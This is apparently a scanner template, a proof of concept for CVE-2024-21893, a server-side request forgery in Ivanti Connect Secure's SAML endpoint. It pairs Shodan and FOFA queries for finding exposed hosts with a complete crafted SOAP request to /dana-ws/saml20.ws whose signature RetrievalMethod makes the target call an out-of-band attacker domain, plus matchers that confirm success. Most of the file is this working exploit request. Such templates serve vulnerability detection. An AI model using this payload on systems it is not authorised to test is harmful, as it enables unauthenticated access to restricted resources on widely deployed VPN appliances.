cves/2024/CVE-2024-21893.poc

## id: CVE-2024-21893
## name: Ivanti SAML - Server Side Request Forgery (SSRF)
## author: hack007x
## severity: high
## cve: CVE-2024-21893
## tags: cve,cve2024,kev,ssrf,ivanti,vkev,vuln
## description: A server-side request forgery vulnerability in the SAML component of Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x) and Ivanti Neurons for ZTA allows an attacker to access certain restricted resources without authentication.
## affects: Update Ivanti Connect Secure, Policy Secure, and Neurons for ZTA to the latest patched versions.
## cvss-score: 8.2
## reference: https://attackerkb.com/topics/FGlK1TVnB2/cve-2024-21893/rapid7-analysis
## reference: https://www.assetnote.io/resources/research/ivantis-pulse-connect-secure-auth-bypass-round-two
## reference: https://github.com/advisories/GHSA-5rr9-mqhj-7cr2
## reference: https://github.com/Chocapikk/CVE-2024-21893-to-CVE-2024-21887
## reference: https://github.com/Ostorlab/KEV
## shodan-query: html:"welcome.cgi?p=logo",http.title:"ivanti connect secure",http.html:"welcome.cgi?p=logo"
## fofa-query: body="welcome.cgi?p=logo",title="ivanti connect secure"
## verification: true

POST /dana-ws/saml20.ws HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}

<?xml version="1.0" encoding="UTF-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">	<soap:Body>		<ds:Signature		xmlns:ds="http://www.w3.org/2000/09/xmldsig#">			<ds:SignedInfo>				<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>				<ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>			</ds:SignedInfo>			<ds:SignatureValue>qwerty</ds:SignatureValue>			<ds:KeyInfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.w3.org/2000/09/xmldsig" xmlns:ds="http://www.w3.org/2000/09/xmldsig#">				<ds:RetrievalMethod URI="http://{{oob_domain}}"/>				<ds:X509Data/>			</ds:KeyInfo>			<ds:Object></ds:Object>		</ds:Signature>	</soap:Body></soap:Envelope>

#@ oob: dns
#@ condition: and
#@ matcher: oob_received == true
#@ matcher: body contains "/dana-na/"
#@ matcher: body contains "WriteCSS"





# @VEIL-STAMP: f3eec3db994d2e45e05bb5df9ecf913cfc49622eb7b85283b2611d0bd0536e4c
